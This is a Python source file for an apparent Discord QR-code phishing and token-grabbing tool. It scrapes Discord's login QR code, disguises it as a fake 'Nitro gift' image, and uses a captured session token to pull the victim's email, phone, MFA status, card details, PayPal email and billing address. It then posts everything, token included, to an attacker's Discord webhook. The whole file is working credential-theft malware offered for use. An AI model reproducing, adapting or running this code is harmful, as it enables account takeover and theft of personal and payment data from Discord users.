import os
from discord_webhook import DiscordEmbed, DiscordWebhook
from discord_webhook.webhook_exceptions import ColorNotInRangeException
from PIL import Image
from requests import get
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from constants import (
    EMBED_AVATAR,
    EMBED_COLOR,
    EMBED_USERNAME,
    PAYMENT_CARD,
    PAYMENT_PAYPAL,
)
from exceptions import InvalidToken, QRCodeNotFound, WebhookSendFailure


class QRGrabber:
    __slots__ = "resources_path"

    def __init__(self, resources_path: str) -> None:
        self.resources_path = resources_path

    def get_qr_from_source(self, driver: webdriver):
        elements = driver.find_elements(By.TAG_NAME, "svg")
        if len(elements) != 5:
            raise QRCodeNotFound(
                "The QR code could not be found on the Discord login page — please try again or contact the developers."
            )
        element = elements[3]
        return element.get_attribute("outerHTML")

    def generate_qr_for_template(self, path_1: str, path_2: str) -> None:
        qr_img = Image.open(path_1, "r")
        ovly_img = Image.open(
            os.path.join(
                os.path.dirname(os.path.realpath(__file__)),
                self.resources_path,
                "overlay.png",
            ),
            "r",
        )
        qr_width, qr_height = qr_img.size
        center_x = qr_width // 2
        center_y = qr_height // 2
        logo_width, logo_height = ovly_img.size
        logo_top_left_x = center_x - logo_width // 2
        logo_top_left_y = center_y - logo_height // 2
        qr_img.paste(ovly_img, (logo_top_left_x, logo_top_left_y))
        qr_img.save(path_2, quality=95)

    def generate_nitro_template(self, path_2: str) -> None:
        nitro_template = Image.open(
            os.path.join(
                os.path.dirname(os.path.realpath(__file__)),
                self.resources_path,
                "template.png",
            ),
            "r",
        )
        nitro_template.paste(Image.open(path_2, "r"), (120, 409))
        nitro_template.save("discord_gift.png", quality=95)


class TokenInfo:
    __slots__ = (
        "headers",
        "token",
        "id",
        "username",
        "discriminator",
        "email",
        "phone",
        "mfa_enabled",
        "has_nitro",
        "payment_source",
        "card_brand",
        "card_last_4_digits",
        "card_expiry_date",
        "paypal_email",
        "billing_name",
        "address_1",
        "address_2",
        "country",
        "state",
        "city",
        "postal_code",
    )

    def __init__(self, token: str) -> None:
        self.headers = {"Authorization": token, "Content-Type": "application/json"}

        if not self.check_token():
            raise InvalidToken

        std_response = get(
            "https://discordapp.com/api/v6/users/@me", headers=self.headers
        ).json()
        payment_response = get(
            "https://discordapp.com/api/v6/users/@me/billing/payment-sources",
            headers=self.headers,
        ).json()
        subscriptions_response = get(
            "https://discordapp.com/api/v9/users/@me/billing/subscriptions",
            headers=self.headers,
        ).json()

        self.token = token
        self.id = std_response["id"]
        self.username = std_response["username"]
        self.discriminator = std_response["discriminator"]
        self.email = std_response["email"]
        self.phone = std_response["phone"]
        self.mfa_enabled = "enabled" if std_response["mfa_enabled"] else "disabled"
        self.has_nitro = bool(subscriptions_response)

        self.payment_source = None
        self.card_brand = None
        self.card_last_4_digits = None
        self.card_expiry_date = None
        self.paypal_email = None
        self.billing_name = None
        self.address_1 = None
        self.address_2 = None
        self.country = None
        self.state = None
        self.city = None
        self.postal_code = None

        if bool(payment_response):
            for data in payment_response:
                if data["type"] == 1 or data["type"] == 2:
                    if data["type"] == 1:
                        self.payment_source = PAYMENT_CARD
                        self.card_brand = data["brand"]
                        self.card_last_4_digits = data["last_4"]
                        self.card_expiry_date = (
                            f'{data["expires_month"]}/{data["expires_year"]}'
                        )
                    elif data["type"] == 2:
                        self.payment_source = PAYMENT_PAYPAL
                        self.paypal_email = data["email"]
                    self.billing_name = data["billing_address"]["name"]
                    self.address_1 = data["billing_address"]["line_1"]
                    self.address_2 = data["billing_address"]["line_2"]
                    self.country = data["billing_address"]["country"]
                    self.state = data["billing_address"]["state"]
                    self.city = data["billing_address"]["city"]
                    self.postal_code = data["billing_address"]["postal_code"]

    def send_info_to_webhook(self, webhook_url: str) -> bool:
        try:
            webhook = DiscordWebhook(
                url=webhook_url, username=EMBED_USERNAME, avatar_url=EMBED_AVATAR
            )
            embed = DiscordEmbed(color=EMBED_COLOR)
            embed.add_embed_field(
                name="User Token Info",
                value=f""":crown:`Username:` **{self.username}#{self.discriminator}**
:id:`User ID:` **{self.id}**
:e_mail:`Mail:` **{self.email}**
:mobile_phone:`Phone:` **{self.phone}**
:money_with_wings:`Nitro:` **{':white_check_mark:' if self.has_nitro else ':x:'}**""",
                inline=False,
            )

            if self.billing_name is not None:
                if self.payment_source == PAYMENT_CARD:
                    embed.add_embed_field(
                        name="Payment Info (Debit or Credit Card)",
                        value=f""":credit_card:`Brand:` ||**{self.card_brand}**||
:information_source:`Last 4:` ||**{self.card_last_4_digits}**||
:date:`Expiration:` ||**{self.card_expiry_date}**||""",
                    )

                elif self.payment_source == PAYMENT_PAYPAL:
                    embed.add_embed_field(
                        name="Payment Info (Paypal)",
                        value=f":incoming_envelope:`Paypal Mail:` ||**{self.paypal_email}**||",
                    )

                embed.add_embed_field(
                    name="Billing Address",
                    value=f"""***Billing Adress:***
:name_badge:`Name:` ||**{self.billing_name}**||
:paperclip:`Line 1:` ||**{self.address_1}**||
:paperclips:`Line 2:` ||**{self.address_2}**||
:flag_white:`Country:` ||**{self.country}**||
:triangular_flag_on_post:`State:` ||**{self.state}**||
:cityscape:`City:` ||**{self.state}**||
:postbox:`Postal Code:` ||**{self.postal_code}**||
""",
                    inline=False,
                )

            else:
                embed.add_embed_field(
                    name="Payment Info (:x:)",
                    value="**No Payment Info Founded.**\n",
                    inline=False,
                )
            embed.add_embed_field(
                name="Token", value=f"```yaml\n{self.token}\n```", inline=False
            )
            embed.set_footer(text="By Lemon.-_-.#3714", inline=False)
            webhook.add_embed(embed)
            webhook.execute()
            return True
        except ColorNotInRangeException as e:
            raise WebhookSendFailure(
                f"Failed to send the token information webhook: {e}"
            )

    def check_token(self) -> bool:
        response = get("https://discord.com/api/v6/users/@me", headers=self.headers)
        if response.status_code == 200:
            return True
        else:
            return False

    def __repr__(self) -> str:
        return self.__dir__()
